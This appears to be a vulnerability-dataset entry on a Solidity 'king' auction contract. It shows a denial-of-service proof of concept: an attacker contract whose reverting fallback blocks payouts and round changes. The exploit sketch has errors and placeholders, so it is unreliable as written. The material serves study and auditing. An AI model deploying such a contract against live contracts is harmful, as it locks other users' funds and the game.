## Vulnerable Code

```javascript
contract KingOfNarnia {
............
    address public king;    //Vulnerable position_1
............
function bid (uint256 _roundNumber, string _message) payable public {
    require(bytes(_message).length <= maxMessageChars);
    require(msg.value > 0);
    
    if (_roundNumber == currentRoundNumber && !roundExpired()) {
      // bid in active round
      require(msg.value > lastBidAmount);
    }else if (_roundNumber == (currentRoundNumber+1) && roundExpired()) {
      // first bid of new round, process old round
      var lastRoundPotBalance = this.balance.sub(msg.value);
      uint256 devFee = lastRoundPotBalance.mul(devFeePercent).div(100);
      owner.transfer(devFee);
      uint256 winnings = lastRoundPotBalance.sub(devFee).mul(100 - rolloverPercent).div(100);
      king.transfer(winnings);  //Vulnerable position_2

      // save previous round data
      roundToKing[currentRoundNumber] = king;
      roundToWinnings[currentRoundNumber] = winnings;
      roundToFinalBid[currentRoundNumber] = lastBidAmount;
      roundToFinalMessage[currentRoundNumber] = kingsMessage;

      currentBidNumber = 0;
      currentRoundNumber++;

      if (nextBidExpireBlockLength != 0) {
        bidExpireBlockLength = nextBidExpireBlockLength;
        nextBidExpireBlockLength = 0;
      }
    }else {
      require(false);
    }

    // new king
    king = msg.sender;      //Vulnerable position_3
    kingsMessage = _message;
    lastBidAmount = msg.value;
    lastBidBlock = block.number;

    NewKing(currentRoundNumber, king, kingsMessage, lastBidAmount, currentBidNumber, lastBidBlock);

    currentBidNumber++;
  }
............
}
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“bid(uint256, string)”)), ..., ...);
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look the comment of '//Vulnerable position_1', here it declare an global variable.then look at "//Vulnerable position_3", here the global variable is assignment with 'msg.sender'(possible is an malicious address).so look at '//Vulnerable position_2' here will always failed! ps:"...." represent an appropriate parameter
